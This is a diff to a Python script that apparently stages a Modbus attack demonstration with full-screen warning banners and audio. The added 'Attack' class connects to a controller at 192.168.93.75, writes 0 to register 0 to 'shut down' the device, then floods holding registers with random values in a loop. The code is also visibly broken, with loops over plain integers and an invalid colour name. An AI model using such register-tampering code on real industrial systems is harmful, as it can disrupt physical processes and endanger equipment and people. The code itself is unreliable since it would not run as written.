@@ -1,6 +1,7 @@
 import os
 from pymodbus.client import ModbusTcpClient 
-
+from pymodbus.exceptions import ModbusException, ModbusIOException
+from random import randint, choice
 from time import time
 from tkinter import Frame, Label, Tk
 from tkinter.font import Font
@@ -8,13 +9,9 @@ from vlc import MediaPlayer
 
 FILE =  os.path.abspath(os.path.dirname(__file__)) + "/file/"
 
+
+
 def main():
-    print(FILE)
-    attack()
-
-def attack():
-    values = [1024, 2048, 4096, 8192, 16384]
-
     app = Application(modbus= ModbusTcpClient('192.168.93.75'))
     app.run()
     app.destroy()
@@ -22,9 +19,7 @@ def attack():
 class Application(Tk):
     def __init__(
         self,
-        modbus: ModbusTcpClient,
-        # modbus2: ModbusAbstractClient,
-        # skip_warning: bool = False,
+        modbus: ModbusTcpClient
     ) -> None:
         super().__init__()
         self.configure(background="black")
@@ -34,8 +29,6 @@ class Application(Tk):
         self.attributes("-topmost", True)
 
         self.modbus = modbus
-        # self.modbus2 = modbus2
-        # self.skip_warning = skip_warning
     def run(self) -> None:
             self.after(0, self.gui)
             self.mainloop()
@@ -44,8 +37,12 @@ class Application(Tk):
             context = WarningContext(self)
             context.run()
             context.destroy()
-            self.quit()
+            
 
+            attack_context = Attack(self)
+            attack_context.run()
+            attack_context.destroy()
+            self.quit()
 
 class Base(Frame):
     def __init__(self, app: Application) -> None:
@@ -84,7 +81,7 @@ class Base(Frame):
 
 class WarningContext(Base):
 
-    AUDIO: MediaPlayer = MediaPlayer(FILE + "warning.mp3")
+    AUDIO: MediaPlayer = MediaPlayer(FILE + "warning1.mp3")
 
     def gui(self) -> None:
         self.AUDIO.play()
@@ -93,7 +90,7 @@ class WarningContext(Base):
             self,
             text="WARNING",
             background="black",
-            foreground="yellow",
+            foreground="red",
             font=Font(size=200),
         )
         self.blinking_texts.append(text_warning)
@@ -108,46 +105,89 @@ class WarningContext(Base):
             font=Font(size=80),
         )
         self.blinking_texts.append(text_commencing_attack)
-        self.wait(1.6)
-
-        text_in = Label(
-            self,
-            text="IN",
-            background="black",
-            foreground="white",
-            font=Font(size=80),
-        )
-        self.blinking_texts.append(text_in)
-        self.wait(1.6)
-
-        text_countdown = Label(
-            self,
-            text="3",
-            background="black",
-            foreground="white",
-            font=Font(size=150),
-        )
-        self.blinking_texts.append(text_countdown)
-        self.wait(1.6)
-
-        text_countdown.configure(text="2", foreground="yellow", font=Font(size=225))
-        self.wait(1.6)
-
-        text_countdown.configure(text="1", foreground="red", font=Font(size=300))
-        self.wait(1.6)
+        self.wait(10)
 
         self.AUDIO.stop()
-        # self.quit()
+        self.quit()
+        
+class Attack(Base):
+
+    AUDIO_SHD: MediaPlayer = MediaPlayer(FILE + "shutdown.mp3")
+    AUDIO_ATK: MediaPlayer = MediaPlayer(FILE + "attacker.mp3")
 
 
+
+    def gui(self) -> None:
+        values = [1024, 2048, 4096, 8192, 16384]
+        client = ModbusTcpClient('192.168.93.75')
+        client.connect()
+        tmp=1
+        for i in tmp:
+            try:
+                self.AUDIO_SHD.play()
+
+                text_shutdown = Label(
+                    self,
+                    text="SHUT DOWN",
+                    background="back",
+                    foreground="yellow",
+                    font=Font(size=200),
+                )
+                self.blinking_texts.append(text_shutdown)
+                self.start_blinking(1.2, 0.4)
+                self.wait(1.6 * 3)
+                client.write_register(0, 0)
+                response = client.read_holding_registers(0)
+                if isinstance(response, ModbusIOException):
+                    raise response
+                
+                self.AUDIO_SHD.play()
+                self.wait(2)
+                self.AUDIO_SHD.stop()
+
+                self.AUDIO_ATK.play()
+                text_attack = Label(
+                self,
+                text="HI EVERRONE",
+                background="black",
+                foreground="red",
+                font=Font(size=200),
+                )
+                # self.blinking_texts.append(text_attack)
+                # self.start_blinking(1.2, 0.4)
+                # self.wait(1.6 * 3)
+                for i in 20:
+                    self.blinking_texts.append(text_attack)
+                    self.start_blinking(1.2, 0.4)
+                    self.wait(1.6 * 3)
+                    random_value = choice(values)
+                    client.write_register(0, [random_value, randint(0, 99), randint(0, 99)])
+                    response = client.read_holding_registers(0)
+                    if isinstance(response, ModbusIOException):
+                            raise response
+                self.AUDIO_ATK.stop()
+
+                self.AUDIO_SHD.play()
+
+                text_shutdown = Label(
+                    self,
+                    text="SHUT DOWN",
+                    background="back",
+                    foreground="yellow",
+                    font=Font(size=200),
+                )
+                self.blinking_texts.append(text_shutdown)
+                self.start_blinking(1.2, 0.4)
+                self.wait(1.6 * 3)
+                client.write_register(0, 0)
+                response = client.read_holding_registers(0)
+                if isinstance(response, ModbusIOException):
+                    raise response
+                
+                self.AUDIO_SHD.play()
+            except Exception as error:
+                print(error)
+        self.quit()
 if __name__ == "__main__":
-    def show_warning():
-        root = Application(ModbusTcpClient('192.168.93.75'))
-        warning_context = WarningContext(root)
-        warning_context.gui()  # Hiển thị giao diện WarningContext
-        warning_context.pack()  # Sử dụng phương thức pack để hiển thị giao diện
-
-        root.mainloop()  # Chạy vòng lặp chính của ứng dụng
-
-    show_warning()  # Gọi hàm để hiển thị cảnh báo và giao diện tương ứng
+    main()
          
